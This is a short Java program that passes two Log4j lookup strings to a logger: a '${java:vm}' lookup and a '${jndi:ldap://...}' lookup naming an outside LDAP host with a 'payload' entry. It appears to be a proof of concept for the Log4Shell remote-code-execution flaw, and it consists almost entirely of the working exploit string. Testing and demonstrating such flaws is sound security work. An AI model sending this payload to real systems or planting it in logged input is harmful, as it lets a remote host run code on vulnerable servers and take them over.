import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class Main {

    private final static Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.error("${java:vm}");
        logger.error("${jndi:ldap://johnny.aka.corp.amazon.com/cn=payload,dc=my-domain,dc=com}");
    }
}

